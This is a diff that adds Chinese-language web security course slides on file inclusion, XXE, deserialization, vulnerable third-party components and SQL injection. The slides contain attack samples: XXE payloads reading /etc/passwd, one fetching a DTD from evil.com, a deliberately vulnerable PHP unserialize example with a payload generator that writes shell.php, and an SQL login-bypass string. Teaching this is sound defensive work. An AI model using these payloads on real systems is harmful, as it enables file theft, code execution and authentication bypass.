+</section>
+<section class="slide level2">
+
+<ul>
+<li>利用 <a href="http://php.net/manual/zh/wrappers.data.php">data://</a></li>
+</ul>
+<p><img data-src="images/chap0x07/php-include-data-1.png" /></p>
+<ul>
+<li><a href="http://php.net/manual/zh/wrappers.php.php#wrappers.php.filter">php://filter</a></li>
+<li><code>PHP %00</code> 截断漏洞</li>
+</ul>
+</section>
+<section id="prevention-to-php-file-inc" class="slide level2">
+<h2>防御 PHP 文件包含漏洞</h2>
+<ul>
+<li>修改 PHP 的运行时配置文件 <code>php.ini</code>
+<ul>
+<li>开启 <code>open_basedir</code> 函数，将其设置为指定目录，则只有该目录的文件允许被访问</li>
+<li><code>allow_url_include=Off</code> 禁止远程文件包含</li>
+<li>从代码级别避免和修复文件包含漏洞
+<ul>
+<li>过滤文件包含路径变量的输入，采用白名单方式包含文件</li>
+<li>建议禁止从程序外部输入读取包含文件的路径</li>
+</ul></li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="xxe" class="title-slide slide level1">
+<h1>7. XXE 注入</h1>
+
+</section>
+<section class="slide level2">
+
+<p><strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity（XML 外部实体）注入。</p>
+</section>
+<section class="slide level2">
+
+<p><a href="https://asciinema.org/a/LirIB7Ci2dVh8yVQyXfskP7gH"><img data-src="https://asciinema.org/a/LirIB7Ci2dVh8yVQyXfskP7gH.svg" alt="php xxe demo" /></a></p>
+</section>
+<section id="xml-basics" class="slide level2">
+<h2>XML 基础</h2>
+<pre class="xml"><code>&lt;!--1. XML 声明--&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!--2. 文档类型定义 Document Type Definition, DTD （可选）--&gt;
+&lt;!DOCTYPE email [  &lt;!--定义一个名为 email 类型的文档（内部 DTD）--&gt;
+&lt;!ELEMENT email (to,from,title,body)&gt;  &lt;!--定义 email 元素有四个子元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;      &lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;    &lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT title (#PCDATA)&gt;   &lt;!--定义title元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;    &lt;!--定义body元素为”#PCDATA”类型--&gt;
+]&gt;
+&lt;!--3. 文档元素--&gt;
+&lt;email&gt;
+&lt;to&gt;Bob&lt;/to&gt;
+&lt;from&gt;Alice&lt;/from&gt;
+&lt;title&gt;Cryptograpphy&lt;/title&gt;
+&lt;body&gt;We are famous guys.&lt;/body&gt;
+&lt;/email&gt;</code></pre>
+</section>
+<section class="slide level2">
+
+<ul>
+<li><code>内部 DTD</code> - <code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li>
+<li><code>外部 DTD</code>
+<ul>
+<li><h2 id="doctype-根元素-system-文件名"><code>&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</code></h2></li>
+</ul></li>
+</ul>
+</section>
+<section id="xxe-examples" class="slide level2">
+<h2>可以用于 XXE 攻击的 XML 文档举例</h2>
+<pre class="xml"><code>&lt;!-- 利用外部 DTD，读取系统文件 /etc/passwd --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;a&gt;
+        &lt;!-- 读取到的 /etc/passwd 文件内容被保存在 passwd 变量中 --&gt;
+        &lt;value&gt;&amp;passwd;&lt;/value&gt;
+&lt;/a&gt;</code></pre>
+<pre class="xml"><code>&lt;!-- 参数实体定义 --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE aaa [
+    &lt;!ENTITY %f SYSTEM &quot;http://evil.com/evil.dtd&quot;&gt;
+    %f;
+]&gt;
+&lt;aaa&gt;&amp;b;&lt;/aaa&gt;
+
+&lt;!-- 其中 evil.dtd 文件内容如下 --&gt;
+&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre>
+</section>
+<section class="slide level2">
+
+<p>上述 2 个例子中的 <code>XML 实体</code> 引用语法略有不同，但都是使用 <code>ENTITY</code> 关键字声明，可以当做「变量」来理解。</p>
+<ul>
+<li><code>&amp;</code></li>
+<li><code>%</code></li>
+</ul>
+</section>
+<section id="xxe-internals" class="slide level2">
+<h2>XXE 漏洞成因关键</h2>
+<ul>
+<li><code>XML</code> 代码中包含了 <strong>加载外部资源</strong> 的「恶意变量声明」</li>
+<li>服务端代码在解析 <code>XML</code> 代码时 <strong>无限制</strong> 解析「恶意变量」声明语句</li>
+<li>「恶意变量」的值被 <strong>回显</strong></li>
+</ul>
+</section>
+<section id="xxe-impacts" class="slide level2">
+<h2>XXE 漏洞利用典型效果</h2>
+<ul>
+<li>敏感数据泄露（任意文件读取）</li>
+<li>拒绝服务攻击</li>
+<li>服务器端请求伪造</li>
+<li>远程代码执行</li>
+<li>执行应用程序托管服务器的网络端口扫描</li>
+</ul>
+</section>
+<section id="prevention-to-xxe" class="slide level2">
+<h2>防御 XXE 攻击</h2>
+<ul>
+<li>禁用 XML 外部实体和 DTD 处理</li>
+<li>使用无已知漏洞的 XML 解析器引擎组件</li>
+</ul>
+</section>
+<section id="xxe-recommends" class="slide level2">
+<h2>推荐训练学习资源</h2>
+<ul>
+<li><a href="https://github.com/vulnspy/phpaudit-XXE">PHP XXE 漏洞与利用源代码分析示例</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe">vulhub 提供的 XXE 漏洞学习训练环境</a></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>只有 PHP 语言存在 XXE 漏洞吗？</p>
+</blockquote>
+</section>
+<section id="探索一下其他编程语言" class="slide level2">
+<h2>探索一下其他编程语言</h2>
+<ul>
+<li><a href="https://docs.python.org/3/library/xml.html#xml-vulnerabilities">python 官方文档中对 xml 处理的常见漏洞总结</a></li>
+<li><a href="https://snyk.io/vuln/SNYK-PYTHON-PYTHONDOCX-40402">python_docx 存在 XXE 漏洞预警 CVE-2016-5851</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP 的 XXE Cheat Sheet</a></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p><a href="https://asciinema.org/a/agBO50PpWVWA9ggCocQLGIhRQ"><img data-src="https://asciinema.org/a/agBO50PpWVWA9ggCocQLGIhRQ.svg" alt="python xxe demo" /></a></p>
+</section>
+<section id="python-xml-parser-vuls" class="slide level2">
+<h2><a href="https://docs.python.org/3/library/xml.html#xml-vulnerabilities">Python XML 解析器其他漏洞类型</a></h2>
+<table>
+<thead>
+<tr class="header">
+<th>kind</th>
+<th>sax</th>
+<th>etree</th>
+<th>minidom</th>
+<th>pulldom</th>
+<th>xmlrpc</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>billion laughs</td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+</tr>
+<tr class="even">
+<td>quadratic blowup</td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+<td><strong>易受攻击</strong></td>
+</tr>
+<tr class="odd">
+<td>external entity expansion</td>
+<td>安全 (4)</td>
+<td>安全 (1)</td>
+<td>安全 (2)</td>
+<td>安全 (4)</td>
+<td>安全 (3)</td>
+</tr>
+<tr class="even">
+<td>DTD retrieval</td>
+<td>安全 (4)</td>
+<td>安全</td>
+<td>安全</td>
+<td>安全 (4)</td>
+<td>安全</td>
+</tr>
+<tr class="odd">
+<td>decompression bomb</td>
+<td>安全</td>
+<td>安全</td>
+<td>安全</td>
+<td>安全</td>
+<td><strong>易受攻击</strong></td>
+</tr>
+</tbody>
+</table>
+<ol type="1">
+<li>xml.etree.ElementTree 不会扩展外部实体并在实体发生时引发 ParserError。</li>
+<li>xml.dom.minidom 不会扩展外部实体，只是简单地返回未扩展的实体。</li>
+<li>xmlrpclib 不扩展外部实体并省略它们。</li>
+<li>从 Python 3.7.1 开始， <strong>默认情况</strong> 下不再处理外部通用实体。</li>
+</ol>
+</section>
+<section id="xxe-recommends-others" class="slide level2">
+<h2>推荐训练学习资源</h2>
+<ul>
+<li><a href="https://github.com/c4pr1c3/python-xxe">python-xxe</a></li>
+<li><a href="https://github.com/c0ny1/xxe-lab">一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo</a></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="deserialization" class="title-slide slide level1">
+<h1>8. 反序列化漏洞</h1>
+
+</section>
+<section id="serialization-basics" class="slide level2">
+<h2>基础知识</h2>
+<ul>
+<li>序列化是将 <strong>应用程序对象</strong> 状态转换为 <strong>二进制数据或文本数据</strong> 的过程</li>
+<li>反序列化则是其逆向过程，即从 <strong>二进制数据或文本数据</strong> 创建对象状态</li>
+</ul>
+<blockquote>
+<p>应用程序使用该功能来支持有效 <strong>共享或存储</strong> <code>对象状态</code></p>
+</blockquote>
+</section>
+<section id="serialization-usage" class="slide level2">
+<h2>反序列化的典型应用场景</h2>
+<p>和前文的「文件包含」漏洞存在“合理性”类似： <code>反序列化</code> 特性也有典型需求场景</p>
+<ul>
+<li>分布式系统的「远程过程调用」 <strong>传参</strong>：通过网络传输「对象」</li>
+<li>游戏的进度 <strong>存档</strong> （序列化）与 <strong>读档</strong> （反序列化）</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>⚠️ 但和「文件包含」功能一样，很快 <strong>上述 <code>反序列化</code> 过程也遭到攻击者的恶意利用</strong> ⚠️</p>
+</section>
+<section id="特性被滥用或误用导致的漏洞" class="slide level2">
+<h2>「特性」被滥用或误用导致的『漏洞』</h2>
+<ul>
+<li>文件上传</li>
+<li>XXE</li>
+<li>文件包含</li>
+<li>反序列化</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>攻击者通过 <strong>创建恶意的反序列化对象</strong> ，在应用程序执行序列化时远程执行代码和篡改数据</li>
+<li>使用不可信来源的对象序列化的分布式应用程序和 API 特别容易受到反序列化攻击</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>⚠️ <strong>流行的服务端编程语言 PHP、Java 和 Python 等均有可能编写出包含反序列化漏洞的代码</strong> ⚠️</p>
+</section>
+<section id="反序列化漏洞典型案例" class="slide level2">
+<h2>反序列化漏洞典型案例</h2>
+<ul>
+<li><a href="https://commons.apache.org/proper/commons-collections/security-reports.html">2015 年 Apache Commons Collections 反序列化远程命令执行漏洞</a> 影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMS 等</li>
+<li><a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">2017 年 3 月 15 日，fastjson 官方发布安全公告</a> 表示：fastjson 在 1.2.24 及之前版本存在（反序列化）远程代码执行高危安全漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器
+<ul>
+<li>fastjson 是 Java 社区常用的 JSON 和 Java Bean 转换（反序列化）组件</li>
+</ul></li>
+<li><a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">Python 编写的 SQL 注入自动化利用神器 Sqlmap 存在的 Pickle 反序列化漏洞导致代码执行报告</a></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>⚠️ 前方高能，开始「烧脑🤯」⚠️</p>
+</section>
+<section id="php-serialization-official" class="slide level2">
+<h2>PHP 对象序列化基本概念</h2>
+<p><a href="https://www.php.net/manual/zh/language.oop5.serialization.php">PHP 官方文档中摘录如下</a></p>
+<blockquote>
+<p>所有php里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是 <strong>不会保存对象的方法</strong>，只会保存类的名字。</p>
+</blockquote>
+</section>
+<section id="php-unserialize-basics" class="slide level2">
+<h2>PHP 反序列化漏洞原理基础</h2>
+<pre class="php"><code>&lt;?php
+// PHP 的对象序列化过程
+class User {
+
+    private $mobile;
+    protected $age;
+    public $name;
+
+
+    public function say() {
+        echo &quot;My name is $this-&gt;name\n&quot;;
+    }
+
+    public function __construct($age = NULL, $name = NULL, $mobile = NULL) {
+        echo &quot;__construct is called\n&quot;;
+        $this-&gt;age = $age;
+        $this-&gt;name = $name;
+        $this-&gt;mobile = $mobile;
+    }
+
+    public function __toString() {
+        return &quot;$this-&gt;name is $this-&gt;age old\n&quot;;
+    }
+
+    public function __sleep() {
+        echo &quot;__sleep is called\n&quot;;
+        return array(&#39;age&#39;, &#39;name&#39;, &#39;mobile&#39;);
+    }
+
+    public function __wakeup() {
+        echo &quot;__wakeup is called\n&quot;;
+    }
+
+    public function __destruct() {
+        echo &quot;__destruct is called on $this-&gt;name \n&quot;;
+    }
+}
+
+$user = new User(22, &quot;Zhang San&quot;, &quot;13800138000&quot;); // 对象创建时自动触发 __construct()
+echo $user; // $user 对象被当做「字符串」访问，自动触发 __toString()
+
+// 序列化
+$s_user = serialize($user); // 序列化时自动触发 __sleep() 方法
+file_put_contents(&quot;/tmp/ser.bin&quot;, $s_user); // 序列化结果写入文件方便查看输出结果里的「不可打印」字符
+echo $s_user . &quot;\n&quot;; // 打印序列化结果
+system(&quot;hexdump -C /tmp/ser.bin&quot;); // 16 进制方式查看「序列化结果」
+
+// 反序列化
+$r_user = unserialize(file_get_contents(&quot;/tmp/ser.bin&quot;)); // 反序列化时触发 __wakeup() 方法
+$r_user-&gt;name = &quot;Li Si&quot;;
+echo $r_user; // 被 echo 时触发「字符串」转换魔术方法 __toString
+$r_user-&gt;say(); // 调用「恢复出来的对象」的方法
+
+// 序列化过程结束
+printf(&quot;EOF reached\n&quot;);
+
+// 全部脚本执行完毕，自动触发 $user 对象的 __destruct()
+// 注意对象销毁的顺序和对象的创建顺序是相反的
+// 栈操作顺序：先创建，后销毁
+
+// 执行结果如下
+/*
+__construct is called
+Zhang San is 22 old
+__sleep is called
+O:4:&quot;User&quot;:3:{s:6:&quot;*age&quot;;i:22;s:4:&quot;name&quot;;s:9:&quot;Zhang San&quot;;s:12:&quot;Usermobile&quot;;s:11:&quot;13800138000&quot;;}
+00000000  4f 3a 34 3a 22 55 73 65  72 22 3a 33 3a 7b 73 3a  |O:4:&quot;User&quot;:3:{s:|
+00000010  36 3a 22 00 2a 00 61 67  65 22 3b 69 3a 32 32 3b  |6:&quot;.*.age&quot;;i:22;|
+00000020  73 3a 34 3a 22 6e 61 6d  65 22 3b 73 3a 39 3a 22  |s:4:&quot;name&quot;;s:9:&quot;|
+00000030  5a 68 61 6e 67 20 53 61  6e 22 3b 73 3a 31 32 3a  |Zhang San&quot;;s:12:|
+00000040  22 00 55 73 65 72 00 6d  6f 62 69 6c 65 22 3b 73  |&quot;.User.mobile&quot;;s|
+00000050  3a 31 31 3a 22 31 33 38  30 30 31 33 38 30 30 30  |:11:&quot;13800138000|
+00000060  22 3b 7d                                          |&quot;;}|
+00000063
+__wakeup is called
+Li Si is 22 old
+My name is Li Si
+EOF reached
+__destruct is called on Li Si
+__destruct is called on Zhang San
+*/</code></pre>
+</section>
+<section class="slide level2">
+
+<p>看上去 <code>User</code> 对象经过「序列化」（调用 <code>serialize()</code> 函数）之后变成了以下「字符串」：</p>
+<pre><code>O:4:&quot;User&quot;:3:{s:6:&quot;*age&quot;;i:22;s:4:&quot;name&quot;;s:9:&quot;Zhang San&quot;;s:12:&quot;Usermobile&quot;;s:11:&quot;13800138000&quot;;}</code></pre>
+</section>
+<section class="slide level2">
+
+<h3 id="不要被不可打印字符欺骗了">不要被不可打印字符欺骗了</h3>
+<ul>
+<li><code>protected</code> 属性字段 <code>age</code> 左边的 <code>*</code> (2a) 字符的左右两边被不可打印字符 <code>\00</code> 包围</li>
+<li><code>private</code> 属性字段 <code>mobile</code> 左边拼接了字符串 <code>\00User\00</code> 其中 <code>User</code> 是类名</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>经过一番简单的上下文字符串特征比对分析，我们可以总结出如下简单「序列化」规律：</p>
+<ul>
+<li><code>&lt;对象标识&gt;:&lt;类名长度&gt;:"类名":类的成员变量个数:{</code>
+<ul>
+<li><code>O:4:"User":3:{</code></li>
+</ul></li>
+<li><code>&lt;成员变量类型&gt;:&lt;成员变量名长度&gt;:"&lt;成员变量名&gt;";&lt;成员变量值类型&gt;:&lt;成员变量值&gt;;</code>
+<ul>
+<li><code>s:6:"\00*\00age";i:22;</code></li>
+</ul></li>
+<li><code>&lt;成员变量类型&gt;:&lt;成员变量名长度&gt;:"&lt;成员变量名&gt;";&lt;成员变量值类型&gt;:&lt;成员变量值长度&gt;:&lt;成员变量值&gt;;</code>
+<ul>
+<li><code>s:4:"name";s:9:"Zhang San";</code></li>
+</ul></li>
+<li><code>&lt;成员变量类型&gt;:&lt;成员变量名长度&gt;:"&lt;成员变量名&gt;";&lt;成员变量值类型&gt;:&lt;成员变量值长度&gt;:&lt;成员变量值&gt;;}</code>
+<ul>
+<li><code>s:12:"\00User\00mobile";s:11:""13800138000";}</code></li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>至此，我们可以再来回味一下 <a href="https://www.php.net/manual/zh/language.oop5.serialization.php">PHP 官方文档中摘录如下这句话</a> 的关键词为什么用的是 <strong>字节流</strong> ：</p>
+<blockquote>
+<p>所有php里面的值都可以使用函数 serialize() 来返回一个包含 <strong>字节流</strong> 的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<p>基础知识普及完毕，现在终于可以看一下课本里的 PHP 反序列化漏洞原理代码了。</p>
+</section>
+<section id="漏洞代码" class="slide level2">
+<h2>漏洞代码</h2>
+<pre class="php"><code>&lt;?php
+class cuc {
+    var $test = &#39;whatever&#39;;
+    function __wakeup() {
+        $fp = fopen(&quot;shell.php&quot;, &quot;w&quot;);
+        fwrite($fp, $this-&gt;test);
+        fclose($fp);
+        echo &#39;__wakeup&#39;;
+    }
+}
+
+$class = $_GET[&#39;test&#39;];
+
+unserialize($class);</code></pre>
+</section>
+<section id="构造漏洞利用的关键负载" class="slide level2">
+<h2>构造漏洞利用的关键负载</h2>
+<pre class="php"><code>&lt;?php
+class cuc {
+    var $test = &#39;whatever&#39;;
+    function __wakeup() {
+        $fp = fopen(&quot;shell.php&quot;, &quot;w&quot;);
+        fwrite($fp, $this-&gt;test);
+        fclose($fp);
+        echo &#39;__wakeup&#39;;
+    }
+}
+$payload_class = new cuc();
+$payload_class-&gt;test = &quot;&lt;?php phpinfo(); ?&gt;&quot;;
+$payload = serialize($payload_class);
+print(urlencode($payload)); // urlencode() 结果是为了方便使用 curl 时给 GET 参数赋值</code></pre>
+</section>
+<section class="slide level2">
+
+<p><a href="https://asciinema.org/a/pME1z7OyEA12JrXT5dKlwgCQQ"><img data-src="https://asciinema.org/a/pME1z7OyEA12JrXT5dKlwgCQQ.svg" alt="asciicast" /></a></p>
+</section>
+<section id="反序列化漏洞的防御方案" class="slide level2">
+<h2>反序列化漏洞的防御方案</h2>
+<ul>
+<li>将应用程序配置为不接受不可信来源的任何反序列化输入</li>
+<li>仅使用具有基本数据类型的序列化函数（如 PHP 的 json_encode() 和 json_decode()）</li>
+<li>如果这些措施不可行，那么在创建对象之前执行反序列化期间应强制实施约束类型，在较低特权环境（例如，临时容器）中运行反序列化，并限制与执行反序列化的服务器的网络连接</li>
+<li>同时还可通过使用加密或完整性检查（例如，数字签名），防止恶意的对象创建和数据篡改操作</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="vulnerable-component" class="title-slide slide level1">
+<h1>9. 第三方组件缺陷</h1>
+
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>所有 Web 应用程序（甚至连操作系统都没有例外）都依靠由第三方开发和提供的各种软件组件，包括开源组件和商用组件。</p>
+</blockquote>
+</section>
+<section id="心脏滴血" class="slide level2">
+<h2>心脏滴血</h2>
+<p><a href="https://heartbleed.com/">2014 年 4 月，知名开源安全组件 OpenSSL 被爆「心脏滴血」漏洞</a></p>
+<ul>
+<li>利用该漏洞，攻击者可以直接读取远程服务器上的内存数据，其中包括大量运行时的明文密钥、明文口令等机密数据</li>
+<li>攻击者借助恢复出的密钥和口令等，又可以进一步获取远程服务器的高权限</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>由于「依赖于」 OpenSSL 库，Apache 和 Nginx 服务器是当时的重灾区软件
+<ul>
+<li>彼时，根据 <a href="https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html">Netcraft 2014 年 4 月的 Web 服务器市占率统计</a> ，全球 66% 的网站使用了这 2 种服务器软件搭建。这就意味着这部分网站如果没有特别的缓解或防护措施，将无一幸免于这次大规模的漏洞攻击事件</li>
+</ul></li>
+</ul>
+</section>
+<section id="openssl-forks" class="slide level2">
+<h2>心脏滴血之后的 OpenSSL 后浪</h2>
+<ul>
+<li>2014 年「心脏滴血」漏洞引发的全球各地网络攻击事件直接促使了 <code>OpenSSL</code> 的一个新分支 <a href="https://www.libressl.org/">LibreSSL</a> 的诞生
+<ul>
+<li>该项目诞生之初的目标就是为了重构 <code>OpenSSL</code> 代码，改进安全性</li>
+</ul></li>
+<li>2018 年百度安全实验室开源使用 <code>Rust</code> 语言重写的兼容 <code>OpenSSL</code> 的跨平台组件 <a href="https://mesalink.io/">MesaLink</a>
+<ul>
+<li>主打 <code>Rust</code> 语言的内存安全特性</li>
+<li><code>MesaLink</code> 的一个主要应用场景是嵌入式智能设备，例如安卓手机平板、智能音箱、智能电视等</li>
+</ul></li>
+</ul>
+</section>
+<section id="struts2-vulnerabilities-1" class="slide level2">
+<h2>Struts2 之殇</h2>
+<p><img data-src="images/chap0x07/struts-on-wooyun.png" /></p>
+</section>
+<section id="struts2-vulnerabilities-2" class="slide level2">
+<h2>Struts2 之殇</h2>
+<p><img data-src="images/chap0x07/struts-on-cnvd.png" /></p>
+</section>
+<section id="struts2-vulnerabilities-3" class="slide level2">
+<h2>Struts2 之殇</h2>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/Security+Bulletins">Struts2 官方的漏洞公告页面</a></li>
+<li><a href="https://www.cvedetails.com/product/6117/Apache-Struts.html?vendor_id=45">CVEDetails 统计的 Apache Struts 漏洞（缺少2019年和2020年的漏洞信息统计）</a></li>
+</ul>
+<p><img data-src="images/chap0x07/struts2-stats.png" /></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>即使自己编写的代码遵循了最佳安全实践，从代码层面规避了种种安全漏洞，但如果对于依赖的第三方组件出现的漏洞视而不见，开发上线的系统最终仍然难逃被漏洞攻击的命运</p>
+</blockquote>
+</section>
+<section id="web-3rd-party-components" class="slide level2">
+<h2>Web 应用中常见第三方组件</h2>
+<ul>
+<li>富文本编辑器
+<ul>
+<li>CKeditor、FCKeditor</li>
+</ul></li>
+<li>通用开发框架
+<ul>
+<li>Java Struts 2，PHP （Laravel / ThinkPHP / Yii2），Python（Django，Flask）</li>
+</ul></li>
+<li>常用开发库
+<ul>
+<li>Java Apache Commons Collections，OpenSSL（密码学相关），ImageMagick（图像处理），ffmpeg（视频处理）, fastjson</li>
+</ul></li>
+</ul>
+</section>
+<section id="web-3rd-party-harden" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>持续执行监控流程，获取新型安全漏洞的通知、新发布的安全补丁和定期漏洞扫描程序</li>
+</ul>
+</section>
+<section id="延伸到供应链安全" class="slide level2">
+<h2>延伸到供应链安全</h2>
+<ol type="1">
+<li><strong>开发环节</strong> 。软硬件开发环境、开发工具、 <strong>第三方库</strong> 等。</li>
+<li>交付环节。下载、安装光盘、应用商店等。</li>
+<li>使用环节。软件升级、维护等。</li>
+</ol>
+</section>
+<section class="slide level2">
+
+<h3 id="开发工具之殇">开发工具之殇</h3>
+<ul>
+<li><a href="https://www.antiy.com/response/xcodeghost.html">Xcode 非官方版本恶意代码污染事件</a>。
+<ul>
+<li>截止到 2015 年 9 月 20 日，各方已经累计发现当前已确认共 692 种（如按版本号计算为 858 个）App 曾受到污染，受影响的厂商中包括了 <strong>微信、滴滴、网易云音乐</strong> 等著名应用</li>
+</ul></li>
+<li>2017年8月，非常流行的远程终端管理软件 <a href="https://mp.weixin.qq.com/s/I6cJ7xgT5mTESL0TXa1DBw">Xshell 被发现植入了后门代码</a> ，导致大量使用此款工具的用户泄露主机相关的敏感信息</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="过时的第三方组件">过时的第三方组件</h3>
+<p><a href="https://asciinema.org/a/3SAg12gM7RqlUFsiapY7yDBr5"><img data-src="https://asciinema.org/a/3SAg12gM7RqlUFsiapY7yDBr5.svg" alt="asciicast" /></a></p>
+</section>
+<section class="slide level2">
+
+<h3 id="随时可能拖后腿的基础设施">随时可能拖后腿的基础设施</h3>
+<p><img data-src="images/chap0x07/dns-poison.png" /></p>
+</section>
+<section class="slide level2">
+
+<h3 id="pypi-poison">Python 第三方组件仓库投毒</h3>
+<p><a href="https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/"><img data-src="images/chap0x07/pypi-poison.png" /></a></p>
+</section>
+<section class="slide level2">
+
+<h3 id="npmjs-poison">Npm 第三方组件仓库投毒</h3>
+<p><a href="https://www.npmjs.com/search?q=Malicious%20Package"><img data-src="images/chap0x07/npmjs-poison.png" /></a></p>
+</section>
+</section>
+<section>
+<section id="后台相关漏洞" class="title-slide slide level1">
+<h1>后台相关漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>SQL 注入漏洞</li>
+<li>命令注入</li>
+<li>服务端请求伪造</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="sqli" class="title-slide slide level1">
+<h1>10. SQL 注入漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>SQL 注入在今天来看是一项「古老」但「威力巨大」的远程网络攻击技术</li>
+<li>「古老」：最早公开讨论 SQL 注入技术原理的是在 1998 年著名黑客杂志《Phrack》第 54 期上一篇名为 <a href="http://www.phrack.org/issues/54/8.html#article">NT Web Technology Vulnerabilities</a> 的文章
+<ul>
+<li>在这篇文章里作者举了一个针对 <code>MS SQL server 6.5</code> 的 SQL 注入的例子，如下所示：</li>
+</ul></li>
+</ul>
+<pre class="sql"><code>-- MS SQL server 支持批量执行 SQL 语句
+-- 以下 %% %% 之间的内容是「来自 Web 客户端用户可以控制输入的数据」
+SELECT * FROM table WHERE x=%%criteria from webpage user%%
+
+-- 如果攻击者构造的输入数据如下
+1 SELECT * FROM sysobjects
+
+-- 则最终在数据库中执行的 SQL 语句就变为了
+-- 一次执行了 2 条 SQL 语句
+-- 且第 2 条 SQL 语句的执行结果会覆盖第一条 SQL 语句执行的结果
+-- 最终攻击者成功访问到了 sysobjects 表中的所有数据
+SELECT * FROM table WHERE x=1 SELECT * FROM sysobjects</code></pre>
+</section>
+<section class="slide level2">
+
+<p>上述例子展示了 <code>SQL 注入攻击</code> 的一个典型利用效果： <strong>越权读取数据</strong> 。</p>
+</section>
+<section id="sqli-labs" class="slide level2">
+<h2>推荐训练学习资源</h2>
+<ul>
+<li><a href="https://github.com/c4pr1c3/sqli-labs">sqli-labs</a> | <a href="https://gitee.com/c4pr1c3/sqli-labs">sqli-labs 国内 gitee 镜像</a></li>
+<li><a href="https://dev.mysql.com/doc/refman/8.0/en/sql-data-manipulation-statements.html">MySQL 手册</a></li>
+</ul>
+</section>
+<section id="课内演示环境快速搭建" class="slide level2">
+<h2>课内演示环境快速搭建</h2>
+<pre class="bash"><code>git clone https://github.com/c4pr1c3/sqli-labs
+cd sqli-labs &amp;&amp; docker-compose up -d
+
+# 浏览器访问 sqli-labs http://&lt;ip-to-your-host&gt;:7080/
+# 点击页面上的「Setup/reset Database for labs」初始化数据库
+# http://&lt;ip-to-your-host&gt;:7080/sql-connections/setup-db.php
+
+# 浏览器访问 adminer 网页版方式管理数据库 http://&lt;ip-to-your-host&gt;:7081/
+# 方便调试 SQL 注入 payload
+
+# 如果需要通过命令行连接 mysql 容器可以自行修改 docker-compose.yml 增加数据库容器的端口映射规则</code></pre>
+</section>
+<section id="从经典的登录绕过漏洞开始" class="slide level2">
+<h2>从经典的登录绕过漏洞开始</h2>
+<blockquote>
+<p>sqli-labs 里的 Lesson-11 Post - Error Based - Single quotes - String</p>
+</blockquote>
+<p><img data-src="images/chap0x07/sqli-labs-lesson-11.png" /></p>
+</section>
+<section class="slide level2">
+
+<h3 id="缺陷代码解析">缺陷代码解析</h3>
+<pre class="php"><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);</code></pre>
+</section>
+<section class="slide level2">
+
+<h3 id="sql-debug">在 SQL 控制台里调试关键注入语句</h3>
+<pre class="sql"><code>/* 正常登录过程 */
+SELECT username, password FROM users WHERE username=&#39;admin&#39; and password=&#39;admin&#39; LIMIT 0,1
+
+/* SQL 注入登录过程 */
+
+-- 用户名字段输入随意，例如 1 密码字段输入 1&#39; or 1 -- （注意 -- 左右两边各有一个空格）
+SELECT username, password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39; or 1 -- &#39; LIMIT 0,1
+
